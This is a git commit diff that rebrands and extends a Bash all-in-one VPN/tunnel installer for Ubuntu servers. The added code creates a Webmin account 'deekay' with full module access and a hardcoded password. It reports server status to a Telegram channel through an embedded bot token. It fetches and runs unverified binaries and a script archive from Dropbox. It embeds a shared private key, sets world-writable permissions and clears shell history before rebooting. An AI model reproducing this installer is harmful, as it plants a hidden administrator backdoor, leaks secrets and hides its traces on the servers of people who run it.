fa5b7886159664d13a7baba900442a7aa4c8da0e
SpkHexX <131531947+SpkHexX@users.noreply.github.com>
2024-09-29 06:10:15 +0200

    Update Ubuntu20-24-AIO-SG.sh

--- Ubuntu20-24-AIO-SG.sh
+++ Ubuntu20-24-AIO-SG.sh
@@ -40,11 +40,11 @@ MyVPS_Time='Africa/Johannesburg'
 
 # Telegram IDs
 My_Chat_ID='835541277'
-My_Channel_ID='-1001785530473'
-My_Bot_Key='5993251866:AAHpV-BnGGcdvlfLsaymYkfxpoeYmWFaGs4'
+My_Channel_ID='1482504739'
+My_Bot_Key='6349897878:AAEz1I_fpSFRlcmwYerIMrPcMsyxfM5TQ2E'
 
 ######################################
-###Tekidoer AutoScript Code Begins...###
+###Deekay AutoScript Code Begins...###
 ######################################
 
 function ip_address(){
@@ -111,7 +111,7 @@ systemctl restart webmin
 systemctl status --no-pager webmin
 
 # Banner
-cat <<'tekidoer77' > /etc/zorro-luffy
+cat <<'deekay77' > /etc/zorro-luffy
 <br>
 <font color="#C12267">TEKIDOER | AUSTROPLUS | SERVER<br></font>
 <br>
@@ -122,15 +122,15 @@ cat <<'tekidoer77' > /etc/zorro-luffy
 <font color="#A810FF"> x No Hacking<br></font>
 <br>
 <font color="red">• BROUGHT TO YOU BY <br></font><font color="#00cccc">https://t.me/Tekidoer !<br></font>
-tekidoer77
+deekay77
 
 # Removing some duplicated sshd server configs
 rm -f /etc/ssh/sshd_config
 
 # Creating a SSH server config using cat eof tricks
 cat <<'MySSHConfig' > /etc/ssh/sshd_config
-# Tekidoer Script OpenSSH Server config
-# Tekidoer Script
+# Deekay Script OpenSSH Server config
+# Deekay Script
 Port myPORT1
 Port myPORT2
 AddressFamily inet
@@ -178,7 +178,7 @@ rm -rf /etc/default/dropbear*
  
 # creating dropbear config using cat eof tricks
 cat <<'MyDropbear' > /etc/default/dropbear
-# Tekidoer Script Dropbear Config
+# Deekay Script Dropbear Config
 NO_START=0
 DROPBEAR_PORT=PORT01
 DROPBEAR_EXTRA_ARGS="-p PORT02"
@@ -225,7 +225,7 @@ StunnelDir=$(ls /etc/default | grep stunnel | head -n1)
 
 # Creating stunnel startup config using cat eof tricks
 cat <<'MyStunnelD' > /etc/default/$StunnelDir
-# Tekidoer Script Stunnel Config
+# Deekay Script Stunnel Config
 ENABLED=1
 FILES="/etc/stunnel/*.conf"
 OPTIONS=""
@@ -644,10 +644,10 @@ echo -e "Restarting Squid Proxy server..."
 systemctl restart squid
 
 # Make a folder
-mkdir -p /etc/tekidoervpn
+mkdir -p /etc/deekayvpn
 
 # Cronjob script for auto restart services
-cat <<'ServiceChecker' > /etc/tekidoervpn/service_checker.sh
+cat <<'ServiceChecker' > /etc/deekayvpn/service_checker.sh
 #!/bin/bash
 
 # Telegram configuration
@@ -660,4 +660,371 @@ URL="https://api.telegram.org/bot${KEY}/sendMessage"
 send_telegram_message() {
     local TEXT="$1"
     curl -s --max-time 10 --retry 5 --retry-delay 2 --retry-max-time 10  -d "chat_id=${MYID}&text=${TEXT}&disable_web_page_preview=true&parse_mode=markdown" ${URL}
-   
+    curl -s --max-time 10 --retry 5 --retry-delay 2 --retry-max-time 10  -d "chat_id=${CHANNELID}&text=${TEXT}&disable_web_page_preview=true&parse_mode=markdown" ${URL}
+}
+
+# Server IP and location
+server_ip="IPADDRESS"
+datenow=`date +"%Y-%m-%d %T"`
+IPCOUNTRY=$(curl -s "https://freeipapi.com/api/json/${server_ip}" | jq -r '.countryName')
+
+# List of services to check and their corresponding restart commands
+declare -A service_commands=(
+    ["dropbear"]="sudo systemctl restart dropbear"
+    ["stunnel4"]="sudo systemctl restart stunnel4"
+    ["sslh"]="sudo systemctl restart sslh"
+    ["python3"]="sudo systemctl restart socksproxy"
+    ["sshd"]="sudo systemctl restart ssh"
+    ["squid"]="sudo systemctl restart squid"
+)
+
+# Check and restart services
+for service in "${!service_commands[@]}"; do
+    if pgrep "$service" >/dev/null 2>&1; then
+        echo "$service is running."
+    else
+        echo "$service is not running. Restarting..."
+        eval "${service_commands[$service]}" >/dev/null 2>&1
+        TEXT="Service *$service* was offline on server *${IPCOUNTRY}* and has been restarted successful at *${datenow}*."
+        send_telegram_message "$TEXT"
+    fi
+done
+ServiceChecker
+
+chmod -R 777 /etc/deekayvpn/service_checker.sh
+sed -i "s|MYCHATID|$My_Chat_ID|g" "/etc/deekayvpn/service_checker.sh"
+sed -i "s|MYCHANNELID|$My_Channel_ID|g" "/etc/deekayvpn/service_checker.sh"
+sed -i "s|MYBOTID|$My_Bot_Key|g" "/etc/deekayvpn/service_checker.sh"
+sed -i "s|IPADDRESS|$IPADDR|g" "/etc/deekayvpn/service_checker.sh"
+
+# Webmin Configuration
+sed -i '$ i\deekay: acl adsl-client ajaxterm apache at backup-config bacula-backup bandwidth bind8 burner change-user cluster-copy cluster-cron cluster-passwd cluster-shell cluster-software cluster-useradmin cluster-usermin cluster-webmin cpan cron custom dfsadmin dhcpd dovecot exim exports fail2ban fdisk fetchmail file filemin filter firewall firewalld fsdump grub heartbeat htaccess-htpasswd idmapd inetd init inittab ipfilter ipfw ipsec iscsi-client iscsi-server iscsi-target iscsi-tgtd jabber krb5 ldap-client ldap-server ldap-useradmin logrotate lpadmin lvm mailboxes mailcap man mon mount mysql net nis openslp package-updates pam pap passwd phpini postfix postgresql ppp-client pptp-client pptp-server proc procmail proftpd qmailadmin quota raid samba sarg sendmail servers shell shorewall shorewall6 smart-status smf software spam squid sshd status stunnel syslog-ng syslog system-status tcpwrappers telnet time tunnel updown useradmin usermin vgetty webalizer webmin webmincron webminlog wuftpd xinetd' /etc/webmin/webmin.acl
+sed -i '$ i\deekay:0' /etc/webmin/miniserv.users
+/usr/share/webmin/changepass.pl /etc/webmin deekay 20037
+
+# Some Settings
+sed -i "s|#SystemMaxUse=|SystemMaxUse=10M|g" /etc/systemd/journald.conf
+sed -i "s|#SystemMaxFileSize=|SystemMaxFileSize=1M|g" /etc/systemd/journald.conf
+systemctl restart systemd-journald
+
+# CONFIGURE SLOWDNS
+rm -rf /etc/slowdns
+mkdir -m 777 /etc/slowdns
+#ServerKEY
+cat > /etc/slowdns/server.key << END
+$Serverkey
+END
+# ServerPUB
+cat > /etc/slowdns/server.pub << END
+$Serverpub
+END
+wget -q -O /etc/slowdns/sldns-server "https://raw.githubusercontent.com/fisabiliyusri/SLDNS/main/slowdns/sldns-server"
+chmod +x /etc/slowdns/server.key
+chmod +x /etc/slowdns/server.pub
+chmod +x /etc/slowdns/sldns-server
+
+# Iptables Rule for SlowDNS server
+iptables -I INPUT -p udp --dport 5300 -j ACCEPT
+iptables -t nat -I PREROUTING -p udp --dport 53 -j REDIRECT --to-ports 5300
+
+#install server-sldns.service
+cat > /etc/systemd/system/server-sldns.service << END
+[Unit]
+Description=Server SlowDNS By TekidoerVPN
+Documentation=https://tekidoervpn.site
+After=network.target nss-lookup.target
+
+[Service]
+Type=simple
+User=root
+CapabilityBoundingSet=CAP_NET_ADMIN CAP_NET_BIND_SERVICE
+AmbientCapabilities=CAP_NET_ADMIN CAP_NET_BIND_SERVICE
+NoNewPrivileges=true
+ExecStart=/etc/slowdns/sldns-server -udp :5300 -privkey-file /etc/slowdns/server.key $Nameserver 127.0.0.1:$SSH_Port2
+Restart=on-failure
+
+[Install]
+WantedBy=multi-user.target
+END
+
+#permission service slowdns
+cd
+chmod +x /etc/systemd/system/server-sldns.service
+pkill sldns-server
+systemctl daemon-reload
+systemctl stop server-sldns
+systemctl enable server-sldns
+systemctl start server-sldns
+systemctl restart server-sldns
+systemctl status --no-pager server-sldns
+
+# UDP hysteria
+wget -N --no-check-certificate -q -O ~/install_server.sh https://raw.githubusercontent.com/RepositoriesDexter/Hysteria/main/install_server.sh; chmod +x ~/install_server.sh; ./install_server.sh --version v1.3.5
+rm -f /etc/hysteria/config.json
+echo '{
+  "listen": ":5666",
+  "cert": "/etc/hysteria/hysteria.crt",
+  "key": "/etc/hysteria/hysteria.key",
+  "up_mbps": 100,
+  "down_mbps": 100,
+  "disable_udp": false,
+  "obfs": "Tekidoer",
+  "auth": {
+    "mode": "passwords",
+    "config": ["Tekidoer123"]
+  }
+}
+' >> /etc/hysteria/config.json
+
+#Creating Hysteria CERT
+cat << EOF > /etc/hysteria/hysteria.crt
+Certificate:
+    Data:
+        Version: 3 (0x2)
+        Serial Number:
+            40:26:da:91:18:2b:77:9c:85:6a:0c:bb:ca:90:53:fe
+        Signature Algorithm: sha256WithRSAEncryption
+        Issuer: CN=KobZ
+        Validity
+            Not Before: Jul 22 22:23:55 2020 GMT
+            Not After : Jul 20 22:23:55 2030 GMT
+        Subject: CN=server
+        Subject Public Key Info:
+            Public Key Algorithm: rsaEncryption
+                RSA Public-Key: (1024 bit)
+                Modulus:
+                    00:ce:35:23:d8:5d:9f:b6:9b:cb:6a:89:e1:90:af:
+                    42:df:5f:f8:bd:ad:a7:78:9a:ca:20:f0:3d:5b:d6:
+                    c9:ef:4c:4a:99:96:c3:38:fd:59:b4:d7:65:ed:d4:
+                    a7:fa:ab:03:e2:be:88:2f:ca:fc:90:dd:b0:b7:bc:
+                    23:cb:83:ac:36:e2:01:57:69:64:b8:e1:9e:51:f0:
+                    a6:9d:13:d9:92:6b:4d:04:a6:10:64:a3:3f:6b:ff:
+                    fe:32:ac:91:63:c2:71:24:be:9e:76:4f:87:cc:3a:
+                    03:a1:9e:48:3f:11:92:33:3b:19:16:9c:d0:5d:16:
+                    ee:c1:42:67:99:47:66:67:67
+                Exponent: 65537 (0x10001)
+        X509v3 extensions:
+            X509v3 Basic Constraints: 
+                CA:FALSE
+            X509v3 Subject Key Identifier: 
+                6B:08:C0:64:10:71:A8:32:7F:0B:FE:1E:98:1F:BD:72:74:0F:C8:66
+            X509v3 Authority Key Identifier: 
+                keyid:64:49:32:6F:FE:66:62:F1:57:4D:BB:91:A8:5D:BD:26:3E:51:A4:D2
+                DirName:/CN=KobZ
+                serial:01:A4:01:02:93:12:D9:D6:01:A9:83:DC:03:73:DA:ED:C8:E3:C3:B7
+            X509v3 Extended Key Usage: 
+                TLS Web Server Authentication
+            X509v3 Key Usage: 
+                Digital Signature, Key Encipherment
+            X509v3 Subject Alternative Name: 
+                DNS:server
+    Signature Algorithm: sha256WithRSAEncryption
+         a1:3e:ac:83:0b:e5:5d:ca:36:b7:d0:ab:d0:d9:73:66:d1:62:
+         88:ce:3d:47:9e:08:0b:a0:5b:51:13:fc:7e:d7:6e:17:0e:bd:
+         f5:d9:a9:d9:06:78:52:88:5a:e5:df:d3:32:22:4a:4b:08:6f:
+         b1:22:80:4f:19:d1:5f:9d:b6:5a:17:f7:ad:70:a9:04:00:ff:
+         fe:84:aa:e1:cb:0e:74:c0:1a:75:0b:3e:98:90:1d:22:ba:a4:
+         7a:26:65:7d:d1:3b:5c:45:a1:77:22:ed:b6:6b:18:a3:c4:ee:
+         3e:06:bb:0b:ec:12:ac:16:a5:50:b3:ed:46:43:87:72:fd:75:
+         8c:38
+-----BEGIN CERTIFICATE-----
+MIICVDCCAb2gAwIBAgIQQCbakRgrd5yFagy7ypBT/jANBgkqhkiG9w0BAQsFADAP
+MQ0wCwYDVQQDDARLb2JaMB4XDTIwMDcyMjIyMjM1NVoXDTMwMDcyMDIyMjM1NVow
+ETEPMA0GA1UEAwwGc2VydmVyMIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDO
+NSPYXZ+2m8tqieGQr0LfX/i9rad4msog8D1b1snvTEqZlsM4/Vm012Xt1Kf6qwPi
+vogvyvyQ3bC3vCPLg6w24gFXaWS44Z5R8KadE9mSa00EphBkoz9r//4yrJFjwnEk
+vp52T4fMOgOhnkg/EZIzOxkWnNBdFu7BQmeZR2ZnZwIDAQABo4GuMIGrMAkGA1Ud
+EwQCMAAwHQYDVR0OBBYEFGsIwGQQcagyfwv+HpgfvXJ0D8hmMEoGA1UdIwRDMEGA
+FGRJMm/+ZmLxV027kahdvSY+UaTSoROkETAPMQ0wCwYDVQQDDARLb2JaghQBpAEC
+kxLZ1gGpg9wDc9rtyOPDtzATBgNVHSUEDDAKBggrBgEFBQcDATALBgNVHQ8EBAMC
+BaAwEQYDVR0RBAowCIIGc2VydmVyMA0GCSqGSIb3DQEBCwUAA4GBAKE+rIML5V3K
+NrfQq9DZc2bRYojOPUeeCAugW1ET/H7XbhcOvfXZqdkGeFKIWuXf0zIiSksIb7Ei
+gE8Z0V+dtloX961wqQQA//6EquHLDnTAGnULPpiQHSK6pHomZX3RO1xFoXci7bZr
+GKPE7j4GuwvsEqwWpVCz7UZDh3L9dYw4
+-----END CERTIFICATE-----
+EOF
+
+cat << EOF > /etc/hysteria/hysteria.key
+-----BEGIN PRIVATE KEY-----
+MIICdQIBADANBgkqhkiG9w0BAQEFAASCAl8wggJbAgEAAoGBAM41I9hdn7aby2qJ
+4ZCvQt9f+L2tp3iayiDwPVvWye9MSpmWwzj9WbTXZe3Up/qrA+K+iC/K/JDdsLe8
+I8uDrDbiAVdpZLjhnlHwpp0T2ZJrTQSmEGSjP2v//jKskWPCcSS+nnZPh8w6A6Ge
+SD8RkjM7GRac0F0W7sFCZ5lHZmdnAgMBAAECgYAFNrC+UresDUpaWjwaxWOidDG8
+0fwu/3Lm3Ewg21BlvX8RXQ94jGdNPDj2h27r1pEVlY2p767tFr3WF2qsRZsACJpI
+qO1BaSbmhek6H++Fw3M4Y/YY+JD+t1eEBjJMa+DR5i8Vx3AE8XOdTXmkl/xK4jaB
+EmLYA7POyK+xaDCeEQJBAPJadiYd3k9OeOaOMIX+StCs9OIMniRz+090AJZK4CMd
+jiOJv0mbRy945D/TkcqoFhhScrke9qhgZbgFj11VbDkCQQDZ0aKBPiZdvDMjx8WE
+y7jaltEDINTCxzmjEBZSeqNr14/2PG0X4GkBL6AAOLjEYgXiIvwfpoYE6IIWl3re
+ebCfAkAHxPimrixzVGux0HsjwIw7dl//YzIqrwEugeSG7O2Ukpz87KySOoUks3Z1
+yV2SJqNWskX1Q1Xa/gQkyyDWeCeZAkAbyDBI+ctc8082hhl8WZunTcs08fARM+X3
+FWszc+76J1F2X7iubfIWs6Ndw95VNgd4E2xDATNg1uMYzJNgYvcTAkBoE8o3rKkp
+em2n0WtGh6uXI9IC29tTQGr3jtxLckN/l9KsJ4gabbeKNoes74zdena1tRdfGqUG
+JQbf7qSE3mg2
+-----END PRIVATE KEY-----
+EOF
+
+chmod 755 /etc/hysteria/config.json
+chmod 755 /etc/hysteria/hysteria.crt
+chmod 755 /etc/hysteria/hysteria.key
+
+iptables -t nat -A PREROUTING -i $(ip -4 route ls|grep default|grep -Po '(?<=dev )(\S+)'|head -1) -p udp --dport 20000:50000 -j DNAT --to-destination :5666
+systemctl enable hysteria-server.service
+systemctl restart hysteria-server.service
+
+# Creating startup 1 script using cat eof tricks
+cat <<'deekayz' > /etc/deekaystartup
+#!/bin/sh
+
+# Setting server local time
+ln -fs /usr/share/zoneinfo/MyTimeZone /etc/localtime
+
+# Prevent DOS-like UI when installing using APT (Disabling APT interactive dialog)
+export DEBIAN_FRONTEND=noninteractive
+
+# Allowing SlowDNS to Forward traffic
+iptables -I INPUT -p udp --dport 5300 -j ACCEPT
+iptables -t nat -I PREROUTING -p udp --dport 53 -j REDIRECT --to-ports 5300
+
+# Disable IpV6
+echo 1 > /proc/sys/net/ipv6/conf/all/disable_ipv6
+
+# add DNS server ipv4
+echo "nameserver DNS1" > /etc/resolv.conf
+echo "nameserver DNS2" >> /etc/resolv.conf
+
+# for sslh
+mkdir -p /var/run/sslh
+touch /var/run/sslh/sslh.pid
+chmod 777 /var/run/sslh/sslh.pid
+
+# for udp
+iptables -t nat -A PREROUTING -i $(ip -4 route ls|grep default|grep -Po '(?<=dev )(\S+)'|head -1) -p udp --dport 20000:50000 -j DNAT --to-destination :5666
+
+deekayz
+
+sed -i "s|MyTimeZone|$MyVPS_Time|g" /etc/deekaystartup
+sed -i "s|DNS1|$Dns_1|g" /etc/deekaystartup
+sed -i "s|DNS2|$Dns_2|g" /etc/deekaystartup
+rm -rf /etc/sysctl.d/99*
+
+ # Setting our startup script to run every machine boots 
+cat <<'deekayx' > /etc/systemd/system/deekaystartup.service
+[Unit]
+Description=Custom startup script
+ConditionPathExists=/etc/deekaystartup
+
+[Service]
+Type=oneshot
+ExecStart=/etc/deekaystartup
+RemainAfterExit=true
+
+[Install]
+WantedBy=multi-user.target
+deekayx
+
+chmod +x /etc/deekaystartup
+systemctl enable deekaystartup
+systemctl start deekaystartup
+cd
+
+# Pull BadVPN Binary 64bit or 32bit
+if [ "$(getconf LONG_BIT)" == "64" ]; then
+ wget -O /usr/bin/badvpn-udpgw "https://www.dropbox.com/s/jo6qznzwbsf1xhi/badvpn-udpgw64"
+else
+ wget -O /usr/bin/badvpn-udpgw "https://www.dropbox.com/s/8gemt9c6k1fph26/badvpn-udpgw"
+fi
+
+# Change Permission to make it Executable
+chmod +x /usr/bin/badvpn-udpgw
+ 
+# Setting our startup script for badvpn
+cat <<'deekayb' > /etc/systemd/system/badvpn.service
+[Unit]
+Description=badvpn tun2socks service
+After=network.target
+Wants=network.target
+
+[Service]
+Type=simple
+ExecStart=/usr/bin/badvpn-udpgw --listen-addr 127.0.0.1:7300 --max-clients 1000 --max-connections-for-client 10
+
+[Install]
+WantedBy=multi-user.target
+deekayb
+
+systemctl enable badvpn
+systemctl start badvpn
+
+
+# Some Final Cronjob
+echo "* * * * * root /bin/bash /etc/deekayvpn/service_checker.sh >/dev/null 2>&1" > /etc/cron.d/service-checker
+
+# download script
+cd /usr/local/bin
+wget -O premium-script.tar.gz "https://www.dropbox.com/s/1ex9tr7hzoh53ln/premium-script.tar.gz"
+tar -xvf premium-script.tar.gz
+rm -f premium-script.tar.gz
+cp /usr/local/bin/menu /usr/bin/menu
+cp /usr/local/bin/menu /usr/bin/Menu
+chmod +x /usr/bin/Menu
+chmod +x /usr/bin/menu
+chmod +x ./*
+cd
+
+clear
+cd
+echo " "
+echo " "
+echo "PREMIUM SCRIPT SUCCESSFULLY INSTALLED!"
+echo "SCRIPT BY TEKIDOER DEVS"
+echo "PLEASE WAIT..."
+echo " "
+
+# Finishing
+chown -R www-data:www-data /home/vps/public_html
+
+clear
+echo ""
+echo " INSTALLATION FINISH! "
+echo ""
+echo ""
+echo "Server Information: " | tee -a log-install.txt | lolcat
+echo "   • Timezone       : $MyVPS_Time "  | tee -a log-install.txt | lolcat
+echo "   • IPtables       : [ON]"  | tee -a log-install.txt | lolcat
+echo "   • Auto-Reboot    : [OFF] See menu to [ON] "  | tee -a log-install.txt | lolcat
+
+echo " "| tee -a log-install.txt | lolcat
+echo "Automated Features:"| tee -a log-install.txt | lolcat
+echo "   • Auto restart server "| tee -a log-install.txt | lolcat
+echo "   • Auto disconnect multilogin users [Openvpn]."| tee -a log-install.txt | lolcat
+echo "   • Auto configure firewall every reboot[Protection for torrent and etc..]"| tee -a log-install.txt | lolcat
+
+echo " " | tee -a log-install.txt | lolcat
+echo "Services & Port Information:" | tee -a log-install.txt | lolcat
+echo "   • Dropbear             : [ON] : $Dropbear_Port1 | $Dropbear_Port2 " | tee -a log-install.txt | lolcat
+echo "   • Squid Proxy          : [ON] : $Squid_Port1 | $Squid_Port2" | tee -a log-install.txt | lolcat
+echo "   • SSL through Dropbear : [ON] : 443" | tee -a log-install.txt | lolcat
+echo "   • SSH Websocket        : [ON] : 443 | $WsPort" | tee -a log-install.txt | lolcat
+echo "   • BadVPN               : [ON] : 7300 " | tee -a log-install.txt | lolcat
+echo "   • Hysteria             : [ON] : 20000:50000" | tee -a log-install.txt | lolcat
+echo "   • Nginx                : [ON] : $Nginx_Port" | tee -a log-install.txt | lolcat
+
+echo "" | tee -a log-install.txt | lolcat
+echo "Notes:" | tee -a log-install.txt | lolcat
+echo "  ★ To display list of commands:  " [ menu ] or [ menu dk ] "" | tee -a log-install.txt | lolcat
+echo "" | tee -a log-install.txt | lolcat
+echo "  ★ Other concern and questions of these auto-scripts?" | tee -a log-install.txt | lolcat
+echo "    Direct Messege : https://t.me/Tekidoer" | tee -a log-install.txt | lolcat
+echo ""
+
+clear
+echo ""
+echo ""
+figlet Deekay Script -c | lolcat
+echo ""
+echo "       Installation Complete! System need to reboot to apply all changes! "
+history -c;
+rm /root/Ubuntu20-24-AIO.sh
+echo "           Server will secure this server and reboot after 10 seconds! "
+sleep 10
+reboot
